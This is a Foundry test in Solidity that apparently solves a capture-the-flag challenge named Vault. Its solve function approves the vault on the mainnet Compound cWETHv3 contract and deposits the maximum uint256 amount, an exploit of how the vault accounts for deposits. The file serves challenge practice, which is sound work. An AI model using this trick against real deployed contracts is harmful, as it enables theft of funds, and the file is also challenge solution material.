// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.23;

import {Test, console} from "forge-std/Test.sol";
import {Vault} from "challenges/6-Vault.sol";

import {IERC20} from "openzeppelin-contracts/contracts/token/ERC20/IERC20.sol";


contract VaultTest is Test {
    Vault public vault;

    function setUp() public {
        vault = new Vault();
    }

    function test_solve() public {
        // Vault contract interacts with contracts deployed on mainet to test it run the forked test:
        // forge test --mc Vault --fork-url https://eth-mainnet.g.alchemy.com/v2/<ALCHEMY_API_KEY>
        address cWETHv3 = 0xA17581A9E3356d9A858b789D68B4d866e593aE94;
        cWETHv3.call(abi.encodeWithSignature("allow(address,bool)",address(vault), true ));
        vault.deposit(IERC20(cWETHv3), type(uint256).max);
        assertTrue(vault.isSolved());
    }
}


